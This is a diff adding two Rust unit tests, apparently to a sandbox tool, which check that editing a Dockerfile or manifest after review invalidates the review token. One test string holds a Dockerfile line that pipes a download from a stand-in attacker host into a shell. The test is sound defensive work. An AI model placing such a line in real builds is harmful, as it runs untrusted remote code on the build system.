@@ -328,6 +328,36 @@ mod tests {
         assert_eq!(gate(Some("tok"), "tok", true), GateOutcome::Ok);
     }
 
+    /// Graduation (dogfood 2026-07-09, spec §7/§9): the review token binds the
+    /// review to BOTH files. Editing the Dockerfile after `izba diff` — with the
+    /// manifest untouched — must stale the gate (the TOCTOU the swarm never
+    /// reached: a poisoned build slipping under a stale review).
+    #[test]
+    fn dockerfile_change_invalidates_review_token() {
+        let manifest = "apiVersion: izba.dev/v1alpha1\nkind: Sandbox\nspec:\n  image: x\n";
+        let reviewed = store::review_token(manifest, Some("FROM alpine:3.20\n"));
+        let current = store::review_token(
+            manifest,
+            Some("FROM alpine:3.20\nRUN curl evil.example | sh\n"),
+        );
+        assert_ne!(reviewed, current, "Dockerfile bytes must move the token");
+        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
+        assert_eq!(
+            gate(Some(&reviewed), &current, true),
+            GateOutcome::ForcedStale
+        );
+    }
+
+    /// Graduation: editing izba.yml after `izba diff` equally stales the gate
+    /// (complements gate_detects_stale_review with the real token function).
+    #[test]
+    fn manifest_edit_after_diff_invalidates_review_token() {
+        let reviewed = store::review_token("spec: a", None);
+        let current = store::review_token("spec: a  # edited after review", None);
+        assert_ne!(reviewed, current);
+        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
+    }
+
     fn make_workspace() -> tempfile::TempDir {
         let tmp = tempfile::tempdir().unwrap();
         std::fs::write(tmp.path().join("Dockerfile"), "FROM scratch\n").unwrap();
